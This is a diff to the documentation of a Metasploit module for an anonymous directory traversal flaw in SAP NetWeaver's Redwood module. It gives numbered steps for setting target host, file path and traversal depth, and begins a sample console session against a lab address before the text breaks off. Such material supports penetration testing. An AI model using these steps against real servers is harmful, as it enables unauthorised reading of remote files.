@@ -1,21 +1,24 @@
 # Description
-This is a module for exploitation an anon directory traversal vulnerability in SAP NetWeaver Application Server Java in Redwood module. The vulnerability was active exploited from Chines hackers in the wild in 2017.
 
+This module exploits an anonymous directory traversal vulnerability in the
+Redwood module of the SAP NetWeaver Application Server. The vulnerability was
+actively exploited in the wild in 2017.
 
 # Verification Steps
-```
-Start msfconsole
-use auxiliary/scanner/sap/sap_redwood_traversal
-set RHOSTS [IP]
-set FILEPATH [file_on_remote_server]
-set DEPTH [number]
-run
-```
+
+ 1. Start msfconsole
+ 2. use auxiliary/scanner/sap/sap_redwood_traversal
+ 3. set RHOSTS [IP]
+ 4. set FILEPATH [file_on_remote_server]
+ 5. set DEPTH [number]
+ 6. run
 
 ## Scenarios
+
 Tested on Windows 2008 with SAP NetWeaver AS Java 7.52
+
 ```
-msf5 > use auxiliary/scanner/sap/sap_redwood_traversal 
+msf5 > use auxiliary/scanner/sap/sap_redwood_traversal
 msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set rhosts 192.168.2.164
 rhosts => 192.168.2.164
 msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set DEPTH 25
